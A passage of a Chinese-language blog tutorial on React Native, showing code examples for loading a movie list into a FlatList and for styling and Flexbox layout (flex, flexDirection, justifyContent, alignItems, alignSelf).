class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; useState, Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; View, Text, Button, Alert, Platform, Image, ScrollView, TextInput, FlatList, SectionList, ActivityIndicator, StyleSheet, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 原 url</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> REQUEST_URL =  <span class=\"string\">\"https://raw.githubusercontent.com/facebook/react-native/0.51-stable/docs/MoviesExample.json\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">      data: [],</span><br><span class=\"line\">      loaded: <span class=\"literal\">false</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.fetchData = <span class=\"keyword\">this</span>.fetchData.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 请求数据</span></span><br><span class=\"line\">  fetchData() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> data = <span class=\"built_in\">require</span>(<span class=\"string\">'./test/moivelist.json'</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 通过定时器 模拟ajax</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        data: data.movies,</span><br><span class=\"line\">        loaded: <span class=\"literal\">true</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;, <span class=\"number\">3000</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 真正请求的ajax</span></span><br><span class=\"line\">    <span class=\"comment\">// fetch(REQUEST_URL)</span></span><br><span class=\"line\">    <span class=\"comment\">//   .then((response) =&gt; response.json())</span></span><br><span class=\"line\">    <span class=\"comment\">//   .then((responseData) =&gt; &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     // 注意，这里使用了this关键字，为了保证this在调用时仍然指向当前组件，我们需要对其进行“绑定”操作</span></span><br><span class=\"line\">    <span class=\"comment\">//     this.setState(&#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//       movies: responseData.movies,</span></span><br><span class=\"line\">    <span class=\"comment\">//     &#125;);</span></span><br><span class=\"line\">    <span class=\"comment\">//   &#125;);</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 在生命周期中调用接口</span></span><br><span class=\"line\">  componentDidMount() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.fetchData();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.state.loaded) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.renderLoadingView();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;FlatList</span><br><span class=\"line\">      data=&#123;<span class=\"keyword\">this</span>.state.data&#125;</span><br><span class=\"line\">      renderItem=&#123;<span class=\"keyword\">this</span>.renderMovie&#125;</span><br><span class=\"line\">      style=&#123;styles.list&#125;</span><br><span class=\"line\">      keyExtractor=&#123;item =&gt; item.id&#125;</span><br><span class=\"line\">    /&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 加载动画</span></span><br><span class=\"line\">  renderLoadingView() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;Text&gt;</span><br><span class=\"line\">          正在加载电影数据……</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>View&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 渲染列表</span></span><br><span class=\"line\">  renderMovie(&#123; item &#125;) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// &#123; item &#125;是一种“解构”写法，请阅读ES2015语法的相关文档</span></span><br><span class=\"line\">    <span class=\"comment\">// item也是FlatList中固定的参数名，请阅读FlatList的相关文档</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;Image</span><br><span class=\"line\">          source=&#123;&#123;<span class=\"attr\">uri</span>: item.posters.thumbnail&#125;&#125;</span><br><span class=\"line\">          style=&#123;styles.thumbnail&#125;</span><br><span class=\"line\">        /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;styles.rightContainer&#125;&gt;</span><br><span class=\"line\">          &lt;Text style=&#123;styles.title&#125;&gt;&#123;item.title&#125;&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;Text style=&#123;styles.year&#125;&gt;&#123;item.year&#125;&lt;/</span>Text&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>View&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> styles = StyleSheet.create(&#123;</span><br><span class=\"line\">  list: &#123;</span><br><span class=\"line\">    paddingTop: <span class=\"number\">20</span>,</span><br><span class=\"line\">    backgroundColor: <span class=\"string\">'#F5FCFF'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  container: &#123;</span><br><span class=\"line\">    flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">    flexDirection: <span class=\"string\">'row'</span>,</span><br><span class=\"line\">    justifyContent: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">    alignItems: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">    backgroundColor: <span class=\"string\">'#F5FCFF'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  rightContainer: &#123;</span><br><span class=\"line\">    flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  title: &#123;</span><br><span class=\"line\">    fontSize: <span class=\"number\">20</span>,</span><br><span class=\"line\">    marginBottom: <span class=\"number\">8</span>,</span><br><span class=\"line\">    textAlign: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  year: &#123;</span><br><span class=\"line\">    textAlign: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  thumbnail: &#123;</span><br><span class=\"line\">    width: <span class=\"number\">53</span>,</span><br><span class=\"line\">    height: <span class=\"number\">81</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> App;</span><br></pre></td></tr></table></figure>\n<h1 id=\"设计\"><a href=\"#设计\" class=\"headerlink\" title=\"设计\"></a>设计</h1><h2 id=\"RN中的样式\"><a href=\"#RN中的样式\" class=\"headerlink\" title=\"RN中的样式\"></a>RN中的样式</h2><p>所有的核心组件都接受名为<code>style</code>的属性。这些样式名基本上是遵循了 web 上的 CSS 的命名，只是按照 JS 的语法要求使用了驼峰命名法，例如将<code>background-color</code>改为<code>backgroundColor</code>。</p>\n<ul>\n<li><p><code>style</code>属性可以是一个普通的 JavaScript 对象</p>\n</li>\n<li><p>使用<code>StyleSheet.create</code>来集中定义组件的样式。</p>\n</li>\n</ul>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StyleSheet, Text, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LotsOfStyles</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View&gt;</span><br><span class=\"line\">        &lt;Text style=&#123;styles.red&#125;&gt;just red&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Text style=&#123;styles.bigBlue&#125;&gt;just bigBlue&lt;/</span>Text&gt;</span><br><span class=\"line\">        &lt;Text style=&#123;[styles.bigBlue, styles.red]&#125;&gt;bigBlue, then red&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Text style=&#123;[styles.red, styles.bigBlue]&#125;&gt;red, then bigBlue&lt;/</span>Text&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">const styles = StyleSheet.create(&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  bigBlue: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    color: 'blue',</span></span><br><span class=\"line\"><span class=\"regexp\">    fontWeight: 'bold',</span></span><br><span class=\"line\"><span class=\"regexp\">    fontSize: 30,</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  red: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    color: 'red',</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;);</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"高度与宽度\"><a href=\"#高度与宽度\" class=\"headerlink\" title=\"高度与宽度\"></a>高度与宽度</h2><p>组件的高度和宽度决定了其在屏幕上显示的尺寸。</p>\n<h3 id=\"指定宽高\"><a href=\"#指定宽高\" class=\"headerlink\" title=\"指定宽高\"></a>指定宽高</h3><p>样式中指定固定的<code>width</code>和<code>height</code>。React Native 中的尺寸都是无单位的，表示的是与设备像素密度无关的逻辑像素点。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FixedDimensionsBasics</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">150</span>, <span class=\"attr\">height</span>: <span class=\"number\">150</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>这样给组件设置尺寸也是一种常见的模式，比如要求在不同尺寸的屏幕上都显示成一样的大小。</p>\n<p><img src=\"/view/posts/e61ae078/image-20200326151335084.png\" alt=\"image-20200326151335084\" style=\"zoom:50%;\"></p>\n<p><strong>注意：此时没法适配多种屏幕大小</strong></p>\n<h3 id=\"弹性（Flex）宽高\"><a href=\"#弹性（Flex）宽高\" class=\"headerlink\" title=\"弹性（Flex）宽高\"></a>弹性（Flex）宽高</h3><p>在组件样式中使用<code>flex</code>可以使其在可利用的空间中动态地扩张或收缩。一般而言我们会使用<code>flex:1</code>来指定某个组件扩张以撑满所有剩余的空间。如果有多个并列的子组件使用了<code>flex:1</code>，则这些子组件会平分父容器中剩余的空间。如果这些并列的子组件的<code>flex</code>值不一样，则谁的值更大，谁占据剩余空间的比例就更大（即占据剩余空间的比等于并列组件间<code>flex</code>值的比）。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> App = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;View style=&#123;styles.father&#125;&gt;</span><br><span class=\"line\">      &lt;View style=&#123;styles.son1&#125; /&gt;</span><br><span class=\"line\">      &lt;View style=&#123;styles.son2&#125; /&gt;</span><br><span class=\"line\">      &lt;View style=&#123;styles.son3&#125; /&gt;</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  )</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/ 去掉父View中的`flex: 1`。  ----- View不再具有尺寸，因此子组件也无法再撑开。</span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/ 然后再用`height: 300`来代替父View的`flex: 1` ---- 父View的高度变成300</span></span><br><span class=\"line\"><span class=\"regexp\">const styles = StyleSheet.create(&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  father: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    flex: 1,</span></span><br><span class=\"line\"><span class=\"regexp\">    /</span><span class=\"regexp\">/ flexDirection: \"row\", /</span><span class=\"regexp\">/ 改变子元素的伸缩方向</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  son1: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    flex: 1,</span></span><br><span class=\"line\"><span class=\"regexp\">    backgroundColor: 'powderblue'</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  son2: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    flex: 2, </span></span><br><span class=\"line\"><span class=\"regexp\">    backgroundColor: 'skyblue'</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  son3: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    flex: 3,</span></span><br><span class=\"line\"><span class=\"regexp\">    backgroundColor: 'steelblue'</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;);</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200326151248022.png\" alt=\"image-20200326151248022\" style=\"zoom:50%;\"></p>\n<h2 id=\"使用Flexbox布局\"><a href=\"#使用Flexbox布局\" class=\"headerlink\" title=\"使用Flexbox布局\"></a>使用Flexbox布局</h2><p>Flexbox 可以在不同屏幕尺寸上提供一致的布局结构。</p>\n<p>使用<code>flexDirection</code>、<code>alignItems</code>和 <code>justifyContent</code>三个样式属性就已经能满足大多数布局需求。</p>\n<blockquote>\n<p>React Native 中的 Flexbox 的工作原理和 web 上的 CSS 基本一致，当然也存在少许差异。首先是默认值不同：<code>flexDirection</code>的默认值是<code>column</code>而不是<code>row</code>，而<code>flex</code>也只能指定一个数字值。</p>\n</blockquote>\n<h3 id=\"Flex\"><a href=\"#Flex\" class=\"headerlink\" title=\"Flex\"></a>Flex</h3><p>如上</p>\n<h3 id=\"Flex-Direction\"><a href=\"#Flex-Direction\" class=\"headerlink\" title=\"Flex Direction\"></a>Flex Direction</h3><p><code>flexDirection</code>可以决定布局的<strong>主轴</strong>。<strong>水平轴(<code>row</code>)</strong>方向，竖直轴(<code>column</code>)<strong>方向。默认值是</strong>竖直轴(<code>column</code>)方向。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`flexDirection`改为`column`看看</span></span><br><span class=\"line\">      &lt;View style=&#123;&#123;<span class=\"attr\">flex</span>: <span class=\"number\">1</span>, <span class=\"attr\">flexDirection</span>: <span class=\"string\">'row'</span>&#125;&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200326154915534.png\" alt=\"image-20200326154915534\" style=\"zoom:50%;\"></p>\n<h3 id=\"布局方向\"><a href=\"#布局方向\" class=\"headerlink\" title=\"布局方向\"></a>布局方向</h3><p><strong>LTR：文本和子项，从左到右排列</strong></p>\n<p>布局方向指定层次结构中子级和文本的布局方向。 布局方向也会影响边的起点和终点。</p>\n<p> 默认情况下，React Native使用LTR布局方向进行布局。 在此模式下，开始是指左，结束是指右。</p>\n<p>LTR（默认值）文本和子项，从左到右排列。 元素的开始处应用的边距和填充在左侧。</p>\n<p>RTL文本和子级，从右到左排列。 应用于元素开始的边距和填充在右侧。</p>\n<h3 id=\"Justify-Content\"><a href=\"#Justify-Content\" class=\"headerlink\" title=\"Justify Content\"></a>Justify Content</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`justifyContent`改为`center`看看</span></span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`flexDirection`改为`row`看看</span></span><br><span class=\"line\">      &lt;View style=&#123;&#123;</span><br><span class=\"line\">        flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">        flexDirection: <span class=\"string\">'column'</span>, <span class=\"comment\">// 默认纵向布局</span></span><br><span class=\"line\">        justifyContent: <span class=\"string\">'space-between'</span>,</span><br><span class=\"line\">      &#125;&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">100</span>, <span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200326155234896.png\" alt=\"image-20200326155234896\" style=\"zoom:50%;\"></p>\n<h3 id=\"Align-Items\"><a href=\"#Align-Items\" class=\"headerlink\" title=\"Align Items\"></a>Align Items</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`alignItems`改为`flex-start`看看</span></span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`justifyContent`改为`flex-end`看看</span></span><br><span class=\"line\">      <span class=\"comment\">// 尝试把`flexDirection`改为`row`看看</span></span><br><span class=\"line\">      &lt;View style=&#123;&#123;</span><br><span class=\"line\">        flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">        flexDirection: <span class=\"string\">'column'</span>,</span><br><span class=\"line\">        justifyContent: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">        alignItems: <span class=\"string\">'stretch'</span>,</span><br><span class=\"line\">      &#125;&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">width</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200326155524158.png\" alt=\"image-20200326155524158\" style=\"zoom:50%;\"></p>\n<h3 id=\"Align-Self\"><a href=\"#Align-Self\" class=\"headerlink\" title=\"Align Self\"></a>Align Self</h3><p>alignSelf具有与alignItems相同的选项和效果，但是不影响容器中的子元素，您可以将此属性应用于单个子元素，以更改其在其父元素中的对齐方式。alignSelf用alignItems覆盖父类设置的任何选项。</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td 